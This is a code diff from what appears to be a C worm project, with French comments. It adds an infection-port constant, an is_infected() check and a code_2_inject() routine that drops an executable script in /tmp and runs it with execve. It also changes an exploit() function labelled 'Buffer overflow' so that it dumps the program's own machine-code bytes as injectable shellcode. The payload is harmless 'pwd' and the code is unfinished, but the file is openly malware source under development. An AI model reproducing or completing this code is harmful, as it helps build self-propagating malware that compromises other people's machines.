@@ -5,8 +5,19 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define __NR_write 1
+#define O_CREAT 00000100
+#define O_WRONLY 00000001
+#define O_RDWR 00000002
+#define O_TRUNC 00001000
+#define __NR_open 2
+#define __NR_close 3
+#define __NR_execve 59
+
 #define SERVER_PORT 8080
 #define INFECT_PORT 54321
+
+int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr);
 
 struct cell_server {
     unsigned long IP;
@@ -109,19 +120,30 @@ int my_execve(const char *name, char *const argv[], char *const envp[]){
     return ret;
 }
 
+void code_2_inject(){
+	const char hello[] = "#!/bin/bash\npwd\n";
+    int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
+    my_write(fd, hello, sizeof(hello));
+    my_close(fd);
+    my_execve("/tmp/maybe_a_virus",0,0);
+}
+
 void exploit(int connfd){
 	
 	// Buffer overflow
-	char buff[MAX];
+	char buff[350];
 	int buff_size = 49;
 	char * s = &my_write;
-    for (int i =0;s<&my_open;s++,i++){
+	int i =0;
+	for (;s<&exploit;s++,i++){
         buff[i]=*s;
+        printf(" %02x",0xff& buff[i]);
+        if (i%16 ==0){
+            printf("\n");
+        }
     }
-	my_write()
-		// Créer un fichier WX
-		// Ecrire dedans
-		// L'executer
+	printf("\nNombre d'octets = %d\n", i+1);
+	//my_write(connfd,)
 
 }
 
@@ -299,8 +321,8 @@ int entry_point() {
 int main(int argc, char * argv[]) {
 
 	// Call entry_point function where every tasks are done
-	entry_point();
-
+	//entry_point();
+	exploit(3);
     return 0;
 }
 	
